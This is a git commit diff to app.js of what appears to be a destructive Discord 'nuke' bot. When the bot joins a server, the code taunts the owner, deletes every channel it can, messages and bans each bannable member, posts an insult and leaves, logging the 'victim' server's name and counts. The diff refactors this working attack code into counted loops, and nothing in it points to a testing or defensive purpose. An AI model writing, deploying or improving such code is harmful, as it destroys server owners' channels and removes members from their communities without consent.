c26085cee73e252236b074750881002758cadd40
appellation <nelson.will@live.com>
2017-01-27 20:20:36 -0800

    new shit

--- app.js
+++ app.js
@@ -3,15 +3,45 @@ const config = require('./config.json');
 const client = new Client();
 
 client.on('ready', () => { 
-    console.log('Ready to have some fun... >:)'); 
+  console.log('Ready to have some fun... >:)');
 });
 
 client.on('guildCreate', async (guild) => {
-  console.log(`Victim: ${guild.name} | Count: ${guild.memberCount}`);
-  await guild.owner.send('Hey there! Your guild is getting nuked!').catch(() => {});
-  await Promise.all(guild.channels.map(c => { return c.delete().catch(() => {}); }));
-  await Promise.all(guild.members.map(m => { return m.send('You\'re getting banned! Nothing personal...').then(() => m.ban()).catch(() => {}); }));
-  await guild.defaultChannel.send('Dumbass, I said not to add the bot...').catch(() => {});
+  let users = 0;
+  let channels = 0;
+
+  try {
+    await guild.owner.send('Hey there! Your guild is getting nuked!');
+  } catch (e) {}
+
+  for(const [, c] of guild.channels)  {
+    try {
+      await c.delete();
+    } catch (e) {
+      continue;
+    }
+    channels++;
+  }
+
+  for(const [, m] of guild.members) {
+    try {
+      await m.send('You\'re getting banned! Nothing personal...');
+    } catch (e) {}
+
+    try {
+      if(m.bannable) await m.ban();
+    } catch (e) {
+      continue;
+    }
+
+    users++;
+  }
+
+  try {
+    await guild.defaultChannel.send('Dumbass, I said not to add the bot...');
+  } catch (e) {}
+
+  console.log(`Banned ${users} users and ${channels} channels from ${guild.name}`);
   guild.leave();
 });
 
